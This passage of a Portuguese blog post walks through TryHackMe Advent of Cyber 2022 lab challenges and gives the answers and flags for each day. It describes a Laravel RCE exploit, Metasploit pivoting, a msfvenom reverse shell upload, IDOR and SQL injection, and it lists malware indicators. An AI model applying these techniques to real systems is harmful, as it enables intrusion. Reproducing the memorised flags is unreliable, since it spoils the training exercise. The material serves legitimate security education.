<p>Com isso pode ser encontrado a senha <strong>1q2w3e4r</strong>. E com ela deve-se conectar ao alvo para encontrar a flag da segunda questão.
Então, a partir do remmina me conectei com a máquina. Assim, na imagem de fundo da área de trabalho está a flag <strong>THM{I_SEE_YOUR_SCREEN}</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/5.2.png" alt="Acessando o VNC"  />
</p>
<h2 id="day-6-its-beginning-to-look-a-lot-like-phishing">[Day 6] It&rsquo;s beginning to look a lot like phishing</h2>
<p>No sexto dia, são explicados sobre email e os cabeçalhos que compõem estes, como From, To, SPF, MIME-Version, entre outros. É falado sobre as ferramentas emlAnalyzer para fazer análise de emails, emailrep para analisar a reputação do remetente e virustotal para identificar os links ou anexos que possam ter.</p>
<p>Para responder a primeira questão é só abrir o arquivo do email com alguma ferramenta de edição de texto para vê-lo em <em>plaintxt</em>, eu utilizei o Sublime Text para isso. Logo nas primeiras linhas do arquivo, que são os campos de cabeçalho do email, já estão as respostas para as primeira 4 questões.</p>
<p>A primeira e a terceira questão são respondidas utilizando o cabeçalho &ldquo;From&rdquo;, pois elas estão relacionadas a quem teria enviado o email. Onde <strong>Chief Elf</strong> é a resposta da terceira questão e o email <strong><a href="mailto:chief.elf@santaclaus.thm">chief.elf@santaclaus.thm</a></strong> da primeira.</p>
<p>No cabeçalho &ldquo;Return-path&rdquo; está a resposta para a questão 2, <strong><a href="mailto:murphy.evident@bandityeti.thm">murphy.evident@bandityeti.thm</a></strong>, pois nessa questão é pedido qual o endereço de retorno.</p>
<p>E a quarta questão, que pede qual o <em>X-spam score</em>, pode ser respondida utilizando o valor do cabeçalho <em>X-Pm-SpamScore</em> que é <strong>3</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/6.1.png" alt="Cabeçalhos do email"  />
</p>
<p>Agora, é pedido o valor escondido no campo <em>Message-ID</em>. O valor deste cabeçalho está codificado em Base64, então para decodificar dá para utilizar a ferramenta CyberChef. Assim obtemos <strong>AoC2022_Email_Analysis</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/6.2.png" alt="Decodificando Message-ID"  />
</p>
<p>A questão 6 pede pela reputação de quem enviou o email. Para obter essa informação utiliza-se a ferramenta Simple Email Reputation que foi apresentada anteriormente nessa Task. Sendo que é só inserir o email que se deseja analisar no site que é retornado a reputação, no caso desse email é <strong>RISKY</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/6.3.png" alt="Reputação do remetente"  />
</p>
<p>As próximas questões são relacionadas ao anexo do email, para obtê-lo usei o comando emlAnalyzer com as opções -i para passar o caminho do arquivo e &ndash;extract-all para extrair o anexo. Com o anexo podemos ler o nome dele <strong>Division_of_labour-Load_share_plan.doc</strong>, que é a resposta da sétima questão. E usar o comando sha256sum para conseguir o hash, respondendo a oitava questão, <strong>0827bb9a2e7c0628b82256759f0f888ca1abd6a2d903acdb8e44aca6a1a03467</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/6.4.png" alt="Extraindo o anexo"  />
</p>
<p><img loading="lazy" src="/images/aoc2022/6.5.png" alt="Calculando o hash do anexo"  />
</p>
<p>As duas últimas questões ainda são baseadas no anexo, mas agora só vai ser necessário o hash dele. A questão 9 pede qual é a segunda tática do Mitre ATT&amp;CK associada a esse arquivo pelo Virus Total.
Desse modo ao inserir o hash no Virus Total e ir na aba <em>BEHAVIOUR</em>, encontra-se 3 táticas do ATT&amp;CK, sendo a resposta <strong>Defense Evasion</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/6.6.png" alt="Buscando o hash no Virus Total"  />
</p>
<p><img loading="lazy" src="/images/aoc2022/6.7.png" alt="Táticas associadas ao anexo"  />
</p>
<p>Por fim, para a última questão pede pela subcategoria do arquivo informada pelo InQuest. Ao acessar o site e buscar pelo hash encontramos que a subcategoria é <strong>macro_hunter</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/6.8.png" alt="Subcategoria do anexo"  />
</p>
<h2 id="day-7-maldocs-roasting-on-an-open-fire">[Day 7] Maldocs roasting on an open fire</h2>
<p>O dia 7 é sobre o CyberChef e como ele pode ser usado para encontrar URLs em arquivos, aqui está usando o arquivo encontrado na Task de ontem para fazer essa análise. O texto da própria task já é um passo a passo para a resolução das questões.</p>
<p>Para essa task vamos utilizar a máquina virtual anexada, também será utilizado o CyberChef que está salvo nos favoritos do browser da máquina. Após ligar a máquina é só abrir o Firefox e CyberChef que está nos favoritos, então carregar o arquivo .doc que está na área de trabalho e inserir a receita mostrada nessa Task.</p>
<p>Ao inserir todas as operações mostradas a receita deve ficar a seguinte:</p>
<p><img loading="lazy" src="/images/aoc2022/7.2.png" alt="Receita do CyberChef 1"  />
</p>
<p><img loading="lazy" src="/images/aoc2022/7.3.png" alt="Receita do CyberChef 2"  />
</p>
<p><img loading="lazy" src="/images/aoc2022/7.4.png" alt="Receita do CyberChef 3"  />
</p>
<p>O operador Strings busca por sequências de caracteres imprimíveis baseado na tabela ASCII e colocamos um limitador de 258 caracteres. O primeiro Find/Replace busca e remove o regex [\[\]_\n], ou seja os caracteres [, ], _ e quebra de linha. Ao fazer essas operações obtemos alguns comandos de powershell seguidos por algo codificado em Base64.Assim, é usado o Drop Bytes para remover os primeiros caracteres, restando apenas o Base64.</p>
<p>Então com o operador Decobe base64 decodificamos o texto. Porém o powershell utiliza codificação dos caracteres como Unicode UTF-16LE, por isso precisamos utilizar o operador Decode text escolhendo o padrão UTF-16LE (1200).Agora é utilizado Find/Replace de novo para excluir os caracteres &lsquo;, (, ), +, &lsquo;, ` e &ldquo;. E mais uma vez o Find/Replace para substituir ]b2H_ por http.</p>
<p>Agora podemos finalmente utilizar o operador Extract URLs para obter as URLs do documento. Mas elas aparecem em uma linha só separadas por @, com o Split podemos separá-las por linhas. E por fim o Defang URL adiciona [] em cada. para que esses links não possam ser clicados. Dessa forma conseguimos as seguintes URLs:</p>
<p><img loading="lazy" src="/images/aoc2022/7.5.png" alt="URLs obtidas"  />
</p>
<p>Com as URLs, agora é possível responder às questões.
A primeira pede qual a versão do CyberChef naquela máquina, a resposta pode ser encontrada no canto superior esquerdo ou na URL do site, <strong>9.49.0</strong>.</p>
<p>A próxima questão pede quantas operações foram usadas para extrair as URLs, contando podemos ver que foram <strong>10</strong>.</p>
<p>A questão 3 pede qual o nome do malware que uma das URLs tentava baixar. A primeira é a única que indica um arquivo executável, logo o malware é <strong>mysterygift.exe</strong>.</p>
<p>Na quarta questão é pedido qual a última URL encontrada, a resposta é <strong>hxxps[://]cdn[.]bandityeti[.]THM/files/index/</strong>. E a última questão pede por um ticket em uma das URLs. Na penúltima URL encontramos um diretório Goldenticket seguido por <strong>THM_MYSTERY_FLAG</strong>, que é o ticket.</p>
<h2 id="day-8-last-christmas-i-gave-you-my-eth">[Day 8] Last Christmas I gave you my ETH</h2>
<p>Assim como no dia de ontem, hoje a parte teórica da Task contém um passo a passo para resolver a questão. Mas agora o conteúdo é sobre smart contracts, é explicado o que são esses contratos e como podem ser atacados.</p>
<p>A primeira questão não precisa de resposta pois só pede para baixar o zip anexado na Task e abrir o <a href="https://remix.ethereum.org">Remix</a>. Agora para a segunda flag iremos fazer o deploy do contrato EtherStore.sol que veio no zip e atacá-lo com o outro contrato Attack.sol.</p>
<p>Para começar precisamos adicionar os dois contratos ao workspace do remix, isso pode ser feito clicando no botão que tem uma seta para cima e selecionando os arquivos.</p>
<p><img loading="lazy" src="/images/aoc2022/8.1.png" alt="Adicionando os Contratos"  />
</p>
<p>Agora, para que esses contratos possam ser utilizados, eles precisam ser compilados, o que pode ser feito na aba &ldquo;Solidity compiler&rdquo;. Para esses contratos vamos utilizar o compilador 0.8.10, com esse compilador selecionado é só escolher o contrato e compilá-lo clicando em &ldquo;Compile &lt;nome do contrato&gt;&rdquo;.</p>
<p><img loading="lazy" src="/images/aoc2022/8.2.png" alt="Compilação EtherStore"  />
</p>
<p><img loading="lazy" src="/images/aoc2022/8.3.png" alt="Compilação Attack"  />
</p>
<p>Com os dois compilados agora podemos ir para a próxima aba, &ldquo;Deploy &amp; run transactions&rdquo;. Agora vamos selecionar o EtherStore.sol e clicar em &ldquo;Deploy&rdquo;, isso criará um novo menu mais abaixo onde poderemos adicionar e remover alguns valores de uma carteira. Para adicionar algum valor é só selecionar o valor em &ldquo;VALUE&rdquo; e clicar em &ldquo;deposit&rdquo; do novo menu.</p>
<p><img loading="lazy" src="/images/aoc2022/8.4.png" alt="Deploy do EterStore"  />
</p>
<p><img loading="lazy" src="/images/aoc2022/8.5.png" alt="Menu do EtherStore"  />
</p>
<p>Então podemos fazer o ataque a esse contrato, para isso selecionaremos o contrato Attack e do lado de &ldquo;Deploy&rdquo; precisaremos inserir o endereço do contrato que vamos atacar. Como no anterior isso criará um novo menu mais abaixo.</p>
<p><img loading="lazy" src="/images/aoc2022/8.6.png" alt="Deploy do  Attack"  />
</p>
<p><img loading="lazy" src="/images/aoc2022/8.7.png" alt="Menu do Attack"  />
</p>
<p>Por fim, para realizar o ataque, o EtherStore precisa ter algum saldo e devemos inserir um valor menor que esse saldo em &ldquo;VALUE&rdquo; e clicar em &ldquo;attack&rdquo; do novo menu. Com isso feito a flag <strong>flag{411_ur_37h_15_m1n3}</strong> será impressa no terminal ao lado, sendo essa a resposta da segunda questão.</p>
<p><img loading="lazy" src="/images/aoc2022/8.8.png" alt="Terminal com a flag"  />
</p>
<h2 id="day-9-dock-the-halls">[Day 9] Dock the halls</h2>
<p>Hoje o tema da Task é Pivoting, nela é explicado o básico sobre Pivoting e como usar o Metasploit. E como nos dias anteriores tem um passo a passo para a resolução das questões.</p>
<p>A primeira questão pede por qual porta está aberta na máquina alvo. Utilizando o nmap com as mesmas opções que usei e expliquei no <a href="#day-4-scanning-through-the-snow">dia 4</a>, é retornado que a porta <strong>80</strong> está aberta com um servidor web Apache.</p>
<p><img loading="lazy" src="/images/aoc2022/9.1.png" alt="Nmap Scan"  />
</p>
<p>A próxima questão pede qual o framework usado pela aplicação web. Ao acessar a página, no canto inferior esquerdo, está escrito o <strong>Laravel</strong> v8.26.1, que é o framework e sua versão.</p>
<p><img loading="lazy" src="/images/aoc2022/9.2.png" alt="Página Inicial da Aplicação Web"  />
</p>
<p>Ao pesquisar por essa versão do laravel no google, encontrei o <strong>CVE-2021-3129</strong>. Que é a resposta da terceira questão que pede por esse CVE.</p>
<p>As três questões seguintes estão relacionadas ao que foi explicado no texto da Task. Sendo <strong>sessions -u-1</strong> usado para melhorar a última sessão em uma shell de Meterpreter, <strong>/.dockerenv</strong> o diretório que indica ser um Docker e .env o arquivo que contém credenciais, esse arquivo fica no cat /var/www/.</p>
<p>Para exploitar a aplicação web utilizei o módulo multi/php/ignition_laravel_debug_rce do Metasploit, configurando apenas os parâmetros rhost com o IP do alvo e lhost o IP da minha máquina.</p>
<p>A questão 7 pede pelo banco de dados que tem informações úteis. Na shell do meterpreter pode ser utilizado o comando &ldquo;resolve webservice_database&rdquo; para
obter o IP do banco de dados que está sendo utilizado pela aplicação web. Porém é um IP privado que não temos acesso a partir da nossa máquina, então precisa usar as técnicas de pivoting explicadas antes.</p>
<p><img loading="lazy" src="/images/aoc2022/9.3.png" alt="Servidor de Banco de Dados"  />
</p>
<p>Para realizar o pivoting vamos utilizar os seguintes comando no metasploit &ldquo;route add 172.28.101.51/32 -1&rdquo; e &ldquo;route add 172.17.0.1/32 -1&rdquo; que permitirão, respectivamente, enviarmos pacotes para a rede interna dos dockers e a rede do docker com o host.</p>
<p>Agora, na mesma rede, podemos obter as informações do banco de dados com a ajuda de um módulo de scan do metasploit. Ao executá-lo encontramos a tabela <strong>users</strong> que a questão pedia.</p>
<p><img loading="lazy" src="/images/aoc2022/9.4.png" alt="Servidor de Banco de Dados"  />
</p>
<p>Tendo o nome da tabela, podemos utilizar comando de SQL com outro módulo para ler os dados armazenados nela. Dessa forma obtendo um usuário e senha, <strong>p4$$w0rd</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/9.5.png" alt="Conteúdo da Tabela users"  />
</p>
<p>Então para tunelar os pacotes de outros aplicativos além do metasploit da nossa máquina para dentro da rede que comprometemos, usaremos um proxy socks4. Para configurá-lo estaremos usando mais um módulo do metasploit, dessa vez o server/socks_proxy com os parâmetros srvhost=127.0.0.1, srvport=9050 e version=4a. Com isso todo pacote que enviarmos para a máquina nessa porta será redirecionado para a outra rede. Essa porta e versão do socks é a padrão do proxychains, então se quiser utilizar outra precisa também alterar o arquivo /etc/proxychains4.conf.</p>
<p>Assim com o proxychains podemos utilizar o nmap para ver as portas abertas na máquina que esteja hospedando os dockers. E descobrimos que possui as portas <strong>22 e 80</strong> abertas.</p>
<p><img loading="lazy" src="/images/aoc2022/9.6.png" alt="Portas Abertas na Máquina Host"  />
</p>
<p>Para terminar, conectei nessa máquina através do ssh com as credenciais que estavam no banco de dados. O usuário santa já é o root da máquina e ao conectar já temos a flag root.txt, THM{47C61A0FA8738BA77308A8A600F88E4B}.</p>
<p><img loading="lazy" src="/images/aoc2022/9.7.png" alt="root.txt"  />
</p>
<h2 id="day-10-youre-a-mean-one-mr-yeti">[Day 10] You&rsquo;re a mean one, Mr. Yeti</h2>
<p>No décimo dia, é explicado como hackear jogos de browser a partir da alteração da memória RAM. Para isso tem um plugin para o browser Cetus que pode analisar e alterar o valor dos dados armazenados na memória do Web Assembly.</p>
<p>A máquina que está anexada a essa Task possui um jogo de browser rodando e também já vem com o Cetus instalado. Para conseguir as duas flag basta completar dois desafios no jogo. O primeiro desafio é acertar um número aleatório para o guarda e o segundo é não morrer ao passar por algo que causa dano.</p>
<p>No primeiro desafio, após errar o número o guarda informa qual era o número esperado. Então podemos utilizar o Cetus para buscar na memória por esse número e saber onde que ele fica armazenado. Como estamos buscando pelo número exato, utilizamos o operador EQ e pelo tamanho limite podemos imaginar que é um inteiro de 32 bits, logo usaremos o tipo i32.</p>
<p><img loading="lazy" src="/images/aoc2022/10.1.png" alt="Buscando o endereço de memória do número"  />
</p>
<p>Com essa busca é encontrado apenas um endereço de memória que é o que contém o número que buscamos, o valor está em hexadecimal. Clicando no botão azul do lado direito podemos salvar esse endereço para acompanhar as mudanças nele.</p>
<p>Ao conversar com o guarda novamente o valor armazenado no endereço muda. E com alguma ferramenta de conversão de hexa para decimal podemos obter a senha.</p>
<p><img loading="lazy" src="/images/aoc2022/10.2.png" alt="Valor do Endereço de Memória"  />
</p>
<p><img loading="lazy" src="/images/aoc2022/10.3.png" alt="Conversão para Decimal"  />
</p>
<p>Assim ao informar o valor certo para o guarda nos é dada a primeira flag, <strong>THM{5_star_Fl4gzzz}</strong>, e porta atrás se abre permitindo que acessemos outra área do jogo.</p>
<p><img loading="lazy" src="/images/aoc2022/10.4.png" alt="Primeira Flag"  />
</p>
<p>Agora temos que passar por uma ponte onde estão sendo jogadas bolas de neve que ao acertarem o personagem ele perde vida. Para passarmos por isso precisamos encontrar o endereço de memória que armazena a vida e garantirmos que ele não diminua.</p>
<p>Primeiro teremos que fazer uma pesquisa pela memória com o operador EQ e o campo valor vazio, para obtermos todos os endereços. Então deixamos o personagem perder um pouco de vida com as bolas de neve e fazemos uma busca novamente mas com o operador LT, dessa forma poderemos ver quais os endereços que tiveram o valor reduzido desde a busca anterior.</p>
<p><img loading="lazy" src="/images/aoc2022/10.5.png" alt="Busca por Todos os Endereços"  />
</p>
<p><img loading="lazy" src="/images/aoc2022/10.6.png" alt="Busca pelos Endereços que Reduziram o Valor"  />
</p>
<p>Com isso encontrei um endereço que possui valor 70 que é mais ou menos o quanto da barra de vida ainda está verde, então salvo esse endereço nos &ldquo;Bookmarks&rdquo; como no desafio anterior. Com isso na aba &ldquo;Bookmarks&rdquo; podemos selecionar a opção &ldquo;Freeze&rdquo; para impedir que o valor mude, dessa forma o personagem não perderá vida ou morrerá ao atravessar.</p>
<p><img loading="lazy" src="/images/aoc2022/10.7.png" alt="Busca pelos Endereços que Reduziram o Valor"  />
</p>
<p>Por fim para conseguir a segunda flag é só falar com o Bandit Yeti, <strong>THM{yetiyetiyetiflagflagflag}</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/10.8.png" alt="Busca pelos Endereços que Reduziram o Valor"  />
</p>
<h2 id="day-11-not-all-gifts-are-nice">[Day 11] Not all gifts are nice</h2>
<p>Nessa Task é explicado sobre Memory Forensics, ou seja como analisar o conteúdo da memória RAM de um computador. Isso pode ser realizado com o uso do software volatility, que consegue analisar dumps de Windows, Linux e Mac.</p>
<p>Para responder às questões será utilizado a máquina anexada a essa Task que já possui o volatilty e um dump chamado workstation.vmem.</p>
<p>A primeira questão pede pela versão do Windows que foi capturado a imagem da memória. Para obter essa informação usaremos o volatility passando como argumento a imagem da memória e a opção windwos.info. Com isso obtemos que a versão é a <strong>10</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/11.1.png" alt="Obtendo as Informações do Sistema"  />
</p>
<p>As próximas duas questões são relacionadas a um processo que estava rodando na máquina, é perguntado qual o nome do processo/presente que o papai noel deixou e qual o Process ID (PID) dele. Alterando o comando anterior de windows.info para windows.pslist podemos obter uma lista com todos os processos que estavam sendo executados. Ao final dessa lista de encontrá-se o <strong>mysterygift.ex</strong> com o PID <strong>2040</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/11.2.png" alt="Obtendo a Lista de Processos"  />
</p>
<p><img loading="lazy" src="/images/aoc2022/11.3.png" alt="Processo/Presente deixado pelo Papai Noel"  />
</p>
<p>E para a última questão é pedido quantos arquivos podem ser obtidos desse processo. Alterando o plugin novamente, agora para windows.dumpfiles, e utilizando o argumento &ndash;PID 2040 para filtrar os processos, podemos obter os arquivos relacionados ao processo da questão anterior. Assim obtemos <strong>16</strong> arquivos.</p>
<p><img loading="lazy" src="/images/aoc2022/11.4.png" alt="Arquivos do Processo 2040"  />
</p>
<h2 id="day-12-forensic-mcblue-to-the-revscue">[Day 12] Forensic McBlue to the REVscue!</h2>
<p>No dia 12 é explicado sobre anlise de malware, tanto estática sem executar o código malicioso como dinâmica executando o código. O código que vai ser analisado hoje é o processo que foi encontrado ontem durante a análise da memória.</p>
<p>As duas primeiras questões podem ser respondidas utilizando o software &ldquo;Detect It Easy&rdquo; para examinar o mysterygift. A primeira questão pede pela arquitetura, que é <strong>64-bit</strong>. E a segunda pelo packer que foi utilizado para esconder o malware, sendo a resposta <strong>UPX</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/12.1.png" alt="Informações Sobre o Malware"  />
</p>
<p>A última questão também pode ser feita utilizando esse software, com a aba de &ldquo;Strings&rdquo;. Nessa questão é pedido pela URL que o malware utiliza para baixar um arquivo. Filtrando por http:// encontramos a URL <strong><a href="http://bestfestivalcompany.thm/favicon.ico">http://bestfestivalcompany.thm/favicon.ico</a></strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/12.7.png" alt="URL Encontrada no Arquivo"  />
</p>
<p>As questões 3 e 4 pedem pelo compilador que foi utilizado para compilar esse código e quantas técnicas de Discovery do ATT&amp;CK são utilizadas por ele. Para respondê-la utilizaremos o comando CAPA, mas antes precisa-se desempacotar o arquivo utilizando o UPX.</p>
<p>Ao utilizar esses dois comandos obtemos várias informações relacionadas ao malware. Sendo que ele utiliza 5 técnicas do Mitre ATT&amp;CK, mas apenas <strong>2</strong> de Discovery. E que foi utilizado o compilador <strong>Nim</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/12.2.png" alt="Técnicas Associadas ao Malware"  />
</p>
<p><img loading="lazy" src="/images/aoc2022/12.3.png" alt="Compilador Utilizado"  />
</p>
<p>Para as próximas questões será feita uma análise dinâmica, então executaremos o código enquanto o Process Monitor acompanha o que está sendo executado no computador.</p>
<p>Primeiro é pedido qual chave de registro que é abusada pelo malware. Ao filtrar pelas atividades relacionadas a registro e apagar as opções que não são &ldquo;RegCreatekey&rdquo;, encontramos que está sendo alterada a chave <strong>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</strong>. E o valor escrito nessa chave é <strong>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\wishes.bat</strong>, sendo essa a resposta para a questão seguinte.</p>
<p><img loading="lazy" src="/images/aoc2022/12.4.png" alt="Chave de Registro Alterada pelo Malware"  />
</p>
<p>A questão 7 quer saber quais arquivos estão sendo criados pelo malware. Então agora devemos filtrar por atividade de sistema de arquivos. Assim encontramos que está sendo criado dois arquivos, o <strong>test.jpg</strong> e o <strong>wishes.bat</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/12.5.png" alt="Arquivos Criados pelo Malware"  />
</p>
<p>A oitava questão pede por quais domínios o malware está se conectando. Ao filtrar por atividade de rede aparece o <strong>bestfestivalcompany.thm</strong> e o <strong>virustotal.com</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/12.6.png" alt="Sites Conectados pelo Malware"  />
</p>
<h2 id="day-13-simply-having-a-wonderful-pcap-time">[Day 13] Simply having a wonderful pcap time</h2>
<p>Tendo passado da metade do evento, hoje estamos no dia 13. Aqui é explicado sobre análise de pacotes. Pacotes são uma estrutura de dados utilizada para a transmissão de informações entre os computadores, eles possuem um cabeçalho com as informações de origem, destino, detecção de erros, entre outros. E também um campo de payload onde é inserido os dados que se deseja enviar. A partir da análise de pacotes é possível detectar intrusões na rede.</p>
<p>A questão 1 pede pela porcentagem de pacotes de HTTP. Para obter esse dado utilizaremos o &ldquo;Protocol Hierarchy&rdquo; que está no menu Statistics, com isso obtemos a quantidade e porcentagem de pacotes de cada protocolo da nossa captura. Para HTTP foram apenas <strong>0.3</strong> dos pacotes.</p>
<p><img loading="lazy" src="/images/aoc2022/13.1.png" alt="Porcentagem de Pacotes HTTP"  />
</p>
<p>As duas questões seguintes pedem por qual porta recebeu mais de mil pacotes e qual é o serviço associado a essa porta. Esse dado pode ser encontrado na seção &ldquo;TCP&rdquo; do &ldquo;Conversations&rdquo;, que também está no menu Statistics. Podemos ver que das três portas apenas a <strong>3389</strong> recebeu mais de mil pacotes. Essa porta é normalmente utilizada para o Remote Desktop Protocol, <strong>RDP</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/13.2.png" alt="Porta com Mais de Mil Pacotes"  />
</p>
<p>A quarta questão pede pelos domínios que foram pesquisados no DNS. Para filtrar apenas os pacotes referentes a pesquisas de DNS, basta colocar DNS no filtro acima dos pacotes. Com isso obtemos duas pesquisas e duas respostas do DNS para os domínios <strong>bestfestivalcompany[.]thm,cdn[.]bandityeti[.]thm</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/13.3.png" alt="DNS Queries"  />
</p>
<p>Assim como na questão anterior usaremos o filtro mas agora para buscar por pacotes HTTP. A questão pede por quais arquivos foram requisitados utilizando HTTP. Podemos ver que foi feito um GET para <strong>favicon[.]ico,mysterygift[.]exe</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/13.4.png" alt="Requisições HTTP"  />
</p>
<p>Ao clicar em um dos pacotes, logo abaixo aparece mais detalhes do pacotes e clicando para abrir os sub-menus podemos ver todos os dados contidos nele. As próximas duas questões pedem pelo IP que baixou o mysterygift.exe e de qual domínio foi baixado. Olhando as informações do pacote 351, encontramos que o IP de origem foi <strong>10[.]10[.]29[.]189</strong> e foi requisitado do site <strong>cdn[.]bandityeti[.]thm</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/13.5.png" alt="Dados do Pacote do mysterygift"  />
</p>
<p>Ao fazer o mesmo com o pacote 744, que foi o que requisitou o ícone, podemos ver o user-agent que é pedido pela questão oito. Sendo que o user-agent é <strong>Nim httpclient/1.6.8</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/13.6.png" alt="Dados do Pacote do favicon.ico"  />
</p>
<p>Para responder a nona questão antes precisaremos baixar localmente o mysterygift.exe. Para baixá-lo tem que ir no menu &ldquo;File&rdquo;, então em &ldquo;Export Objects&rdquo; e &ldquo;HTTP&rdquo;, por fim escolher o arquivo. Com o arquivo salvo podemos utilizar no terminal o comando sha256sum para obtermos o hash dele, <strong>0ce160a54d10f8e81448d0360af5c2948ff6a4dbb493fe4be756fc3e2c3f900f</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/13.7.png" alt="Hash do mysterygift"  />
</p>
<p>A última questão pede para buscar, no Virus Total, pelos IPs aos quais esse malware se conecta. Ao pesquisar pelo hash no Virus Total e ir na aba &ldquo;Behaviour&rdquo;, aparecem os seguintes IPs. Porém para responder a questão é apenas os de TCP e não precisa da porta, então fica <strong>20[.]99[.]133[.]109,20[.]99[.]184[.]37,23[.]216[.]147[.]64,23[.]216[.]147[.]76</strong> como resposta.</p>
<p><img loading="lazy" src="/images/aoc2022/13.8.png" alt="IPs Conectados pelo mysterygift"  />
</p>
<h2 id="day-14-im-dreaming-of-secure-web-apps">[Day 14] I&rsquo;m dreaming of secure web apps</h2>
<p>Seguindo para o décimo quarto dia, é explicado sobre IDOR em aplicações web. IDOR acontece quando o adversário é capaz de manipular algum parâmetro e não há nenhum controle de acesso para impedi-lo.</p>
<p>Para as questões de hoje vamos entrar na aplicação a partir da conta do Elf McSkidy e buscar por dados de outro elfo e de outra imagem.</p>
<p>A primeira questão pede pelo número do escritório do Elf Pivot McRed. Ao logar na aplicação entramos como McSkidy com a URL &ldquo;/users/101.html&rdquo;, se mudarmos o 101 para outros números podemos acessar os dados dos outros elfos. Assim no 105 encontramos o elfo que precisamos para essa questão, sendo que seu escritório possui o número <strong>135</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/14.1.png" alt="Dados do Elf Pivot McRed"  />
</p>
<p>A próxima questão pede por uma flag que está em uma imagem. Ao ler o código-fonte da página pode-se perceber que as imagens dos perfis são armazenadas em &ldquo;/images/&lt;número&gt;.png&rdquo;.</p>
<p><img loading="lazy" src="/images/aoc2022/14.2.png" alt="Código-fonte para Obter as Imagens"  />
</p>
<p>Então variando o número do mesmo jeito que fizemos para encontrar o elfo, conseguimos encontrar a imagem que contém a flag <strong>THM{CLOSE_THE_DOOR}</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/14.3.png" alt="Flag"  />
</p>
<h2 id="day-15-santa-is-looking-for-a-sidekick">[Day 15] Santa is looking for a Sidekick</h2>
<p>O Task de hoje, dia 15, é focado em validação de entrada do usuário para desenvolvimento seguro. Entradas que não são validadas podem conter arquivos com formatos diferentes do que é esperado pela aplicação ou arquivos maliciosos, assim permitindo um Remote Code Execution (RCE).</p>
<p>A primeira questão pede por qual o nome dado a forma de inserir arquivos que permite ao adversário inserir qualquer arquivo. A resposta para essa questão está logo no início da parte teórica e é <strong>Unrestricted</strong>. Porque uma vez que não tem validação não tem como restringir os arquivos.</p>
<p>A questão 2 pede pelo nome da aplicação web. Ao acessar o IP na máquina anexada no browser encontramos a página <strong>SantaSideKick2</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/15.1.png" alt="Aplicação Web"  />
</p>
<p>A próxima questão pede por uma flag que está armazenada na pasta de documentos do HR_Elf. Para obter essa flag primeiro precisamos conseguir uma shell. A máquina alvo é um Windows, então vamos criar uma shell reversa com o msfvenom com o formato exe e payload para Windows.</p>
<p><img loading="lazy" src="/images/aoc2022/15.2.png" alt="Criando a Shell Reversa com o msfvenom"  />
</p>
<p>Então configurar os parâmetros do multi/hander para escutar a shell.</p>
<p><img loading="lazy" src="/images/aoc2022/15.3.png" alt="Configurando o multi/handler"  />
</p>
<p>Com a listener pronto, podemos fazer o upload da Shell na aplicação web.</p>
<p><img loading="lazy" src="/images/aoc2022/15.4.png" alt="Aplicação Web"  />
</p>
<p>Após alguns segundos obtemos uma sessão do meterpreter. Então navegando até a pasta Documents do usuário HR_Elf encontramos a flag, <strong>THM{Naughty.File.Uploads.Can.Get.You.RCE}</strong>.</p>
<p><img loading="lazy" src="/images/aoc2022/15.5.png" alt="Flag"  />
</p>
<p>As próximas questões agora são mais teóricas referentes à validação de entrada. A técnica para assegurar que um tipo específico de arquivos foi inserido, a resposta é <strong>File Extension Validation</strong>. A técnica para garantir que o adversário não possa acessar o arquivo que ele fez o upload é <strong>File Renaming</strong>. E por último a técnica para ter certeza que o arquivo não é malicioso é <strong>Malware Scanning</strong>.</p>
<h2 id="day-16-sqlis-the-king-the-carolers-sing">[Day 16] SQLi’s the king, the carolers sing</h2>
<p>O conteúdo de hoje é desenvolvimento seguro, assim como ontem, mas agora para defender de ataques de SQL injection. Esse tipo de ataque acontece quando os parâmetros que formam uma pesquisa SQL não são validados, assim permitindo que o adversário os altere. Isso pode levar a um <em>bypass</em> dos mecanismos de autenticação ou obtenção das informações armazenadas no banco de dados.</p>
<p>Para resolver as questões de hoje, precisa-se alterar o código-fonte da aplicação de forma que remova a vulnerabilidade em quatro páginas diferentes, sendo que é explicado como fazer para as duas primeiras. Após fazer as alterações, o código precisa ser salvo clicando &ldquo;CTRL + S&rdquo; e verificado pelos elfos, caso não tenha mais a vulnerabilidade será fornecida a flag.</p>
<p><img loading="lazy" src="/images/aoc2022/16.5.png" alt="Introdução e Botão para Validação"  />
</p>
<p>A primeira questão pede para corrigir a vulnerabilidade do elf.php. Nesse código precisa ser alterado as linhas 4 e 17 para ser adicionado a função <em>intval</em>, que verificará se o valor inserido pelo usuário é um valor inteiro. A flag obtida é <strong>THM{McCode, Elf McCode}</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// linha 4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$query</span><span class="o">=</span><span class="s2">&#34;select * from users where id=&#34;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
